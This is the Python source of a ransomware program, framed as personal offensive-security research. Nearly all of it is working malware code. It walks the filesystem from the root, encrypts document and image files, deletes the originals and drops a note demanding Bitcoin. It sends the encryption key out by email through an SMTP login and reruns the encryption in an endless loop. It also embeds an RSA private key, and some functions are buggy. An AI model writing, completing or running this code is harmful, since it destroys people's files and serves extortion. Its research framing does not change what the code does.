'''
Offensive security Personal Reserch by Mashal Buhamad 2021
This is Ransomware which is developed to test anti-malware, anti-virus, EDR solutions
- Used against Trend-Micro in 2019 and 2021 and in both cases Trend-Micro failed.
- It is a crime to use this code for any illegal activity.
                                ┌───── •✧✧• ─────┐
                                -Mashal Buhamad - 
                                └───── •✧✧• ─────┘
'''

# include crypto
from cryptography.fernet import Fernet
import os
import socket
import platform
import smtplib, ssl
from cryptography.hazmat.primitives import serialization
import base64
from cryptography.exceptions import UnsupportedAlgorithm
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import load_pem_private_key
import time

def note():
    cat = '''
░░░░░░░░░░░░░░░░░░░░░▄▀░░▌
░░░░░░░░░░░░░░░░░░░▄▀▐░░░▌
░░░░░░░░░░░░░░░░▄▀▀▒▐▒░░░▌
░░░░░▄▀▀▄░░░▄▄▀▀▒▒▒▒▌▒▒░░▌
░░░░▐▒░░░▀▄▀▒▒▒▒▒▒▒▒▒▒▒▒▒█
░░░░▌▒░░░░▒▀▄▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄
░░░░▐▒░░░░░▒▒▒▒▒▒▒▒▒▌▒▐▒▒▒▒▒▀▄
░░░░▌▀▄░░▒▒▒▒▒▒▒▒▐▒▒▒▌▒▌▒▄▄▒▒▐
░░░▌▌▒▒▀▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▒█▄█▌▒▒▌
░▄▀▒▐▒▒▒▒▒▒▒▒▒▒▒▄▀█▌▒▒▒▒▒▀▀▒▒▐░░░▄
▀▒▒▒▒▌▒▒▒▒▒▒▒▄▒▐███▌▄▒▒▒▒▒▒▒▄▀▀▀▀
▒▒▒▒▒▐▒▒▒▒▒▄▀▒▒▒▀▀▀▒▒▒▒▄█▀░░▒▌▀▀▄▄
▒▒▒▒▒▒█▒▄▄▀▒▒▒▒▒▒▒▒▒▒▒░░▐▒▀▄▀▄░░░░▀
▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▄▒▒▒▒▄▀▒▒▒▌░░▀▄
▒▒▒▒▒▒▒▒▀▄▒▒▒▒▒▒▒▒▀▀▀▀▒▒▒▄▀

                                ┌───── •✧✧• ─────┐
                              - Welcome to Reality - 
                                └───── •✧✧• ─────┘
    
    Your files have been encrypted. If you need your files back all you have to do
    is send .02 BTC to wallet accont address: xyz 
    Please don't attemp to recover anyother way to avoid losing your data forver.
    
    Good Luck
'''
    f = open("ransomnote.txt", "w")
    f.write(cat)
    f.close()


# Generate Key function.
def genkey():
    key = Fernet.generate_key()
    return(key)

def savekeytofile():
    f = open("demofile2.txt", "bw")
    f.write(genkey())
    f.close()

def loadkeyfromfile():
    f=open("demofile2.txt", "r")
    key=f.read()
    key=key.encode()
    return(key)
    f.close()

## Encrypt Function
def encrypt(key,data):
    enc=enc=Fernet(key).encrypt(mystring)
    return(enc)

## Decrypt Function
def decrypt(key,data):
    dec=Fernet(key).decrypt(data)    
    return(dec)

def encryptfiles():
    path = '/'
    files = []
# r=root, d=directories, f = files
    for r, d, f in os.walk(path):
        for file in f:
            if '.' in file:
                files.append(os.path.join(r, file))
    for f in files: 
        ext = [".jpg",".png",".docx","pdf",".xlsx",".html",".php",".gif",".doc"]
        arr_txt = [x for x in os.listdir() if x.endswith (tuple(ext))]
    #print (arr_txt)
        for i in arr_txt:
            f=open(i,'br')
            data=f.read()
            enc=Fernet(loadkeyfromfile()).encrypt(data)
            f.close()
            f2=open(i+'.boomew','bw')
            f2.write(enc)
            f2.close()
            #f2=open(i,'bw')
            #f2.write(enc)
            #f2.close()
            os.remove(i)
    
def decryptfiles():
    extensions = set(['.jpg','.png'])
    arr_txt = [x for x in os.listdir() if x.endswith(extensions)]
    print (arr_txt)
    for i in arr_txt:
        f=open(i,'br')
        data=f.read()
        dec=Fernet(loadkeyfromfile()).decrypt(data)
        f.close()
        f2=open(i,'bw')
        f2.write(dec)
        f2.close()
        
        
def sendemail(key):	
	smtp_server = "smtp.gmail.com"  
	port = 587  # For starttls
	sender_email = "xxx@gmail.com"        ## need to be corrected
	receiver_email = "xxx@gmail.com"      ## need to be corrected
	password = "xxxx"                     ## need to be corrected
	hostname = socket.gethostname()               
	IPAddr = socket.gethostbyname(hostname)         	
	Platform = platform.version()
	System = platform.system()                    
	message = b"\n\n\nHello from the code the secret key is:\n"+key+b"\n\n Have fun" 

	context = ssl.create_default_context()
	with smtplib.SMTP(smtp_server, port) as server:
		server.ehlo()  # Can be omitted
		server.starttls(context=context)
		server.ehlo()  # Can be omitted
		server.login(sender_email, password)
		server.sendmail(sender_email, receiver_email, message)
  
def signwithpublic(plain_text):
    # ENCRYPTION
    key='''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAoRuQu67aneb1z0CInIc1
gFbUDnRXbdqxunE23Xt2+mtvzse3Box0TpOHgpcq1iDn4kvj/LPYRdOiMPz2Nert
rAwUgNkJcms47a1bfdJrSMpR/Ac7nwtdlA5q3PffZNF39ej1chYGTY2JiHbOWYlL
Y5LKtsejZ6ElgJRYmOpEQe8jYD7dyahkf5sZLhJdSKTzXpTxP16nxUHNdwg5cHbG
bJeu86g1oitqh7iG1TLzcNuGq5A8ZiqZVH8TMbXfFPA5NRF4FVO4OUyGBXlb8UCl
wvZ6P+6f2yjwcZ9q/39kNtmr92MH1iE0V6i5jT9hAvtOALhpfcUxUQpKyNP6sGGo
MQB9zzqVNkdUpVS+Up3D7uZeA7CjMzGtyHaUgoRiWbMTUPfJslW1HdFyPPaPxLpj
5Rah3w85ii/0lH3s2HwMbzpMTiJI/J+QSHYBENjy/nf16rQlfCa8kOH7Qa9MNntB
qcPttKy6fzyjEb7bKOPryMpfhnscNhZG/BPph1j8k+djyjEpwb0TCw4p8/ihYZQ+
k8jD1wA5C8nVtALqhMD6GnBuyvB1hkqPi3xALmEzF3l4W+nDOjAB8gomCsP5xtF3
jAushqluzlDQTpegVGfPsCSKPSwr8/q8qw3ei6vMuoDNU2XzdzzFEdXmyxtiCr/K
PIrkCJ57YQf7OCJEXw2loNkCAwEAAQ==
-----END PUBLIC KEY-----
'''
    key=key.encode()
    print (key)
    public_key = serialization.load_pem_public_key (key)
    cipher_text_bytes = public_key.encrypt(plaintext=plain_text.encode('utf-8'), padding=padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA512(),label=None))
    # CONVERSION of raw bytes to BASE64 representation
    cipher_text = base64.urlsafe_b64encode(cipher_text_bytes)
    print(cipher_text)
    return(cipher_text)

def signwithprivatekey(cipher_text):
    key=b'''-----BEGIN PRIVATE KEY-----
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
DF8jwEzjncPqnGc/FgwObTVGtNvd1g==
-----END PRIVATE KEY-----
'''
    private_key = serialization.load_pem_private_key (key,password=None,)
    decrypted_cipher_text_bytes = private_key.decrypt(ciphertext=base64.urlsafe_b64decode(cipher_text), 
                                                      padding=padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA512(),label=None))
    decrypted_cipher_text = decrypted_cipher_text_bytes.decode('utf-8')
    print(decrypted_cipher_text)

def keeprunning():
#    key=loadkeyfromfile()
#    enc=encrypt(key,mystring)
#    print('Encrypted text:', enc)
#    dec=decrypt(key,enc)
#    print (dec)
    encryptfiles()
    #decryptfiles()
    key=loadkeyfromfile()
    key=str(key)
    data=signwithpublic(key)
    sendemail(data)
    print(signwithprivatekey(data))
    note()

while (True):
    encryptfiles()
    time.sleep(35)
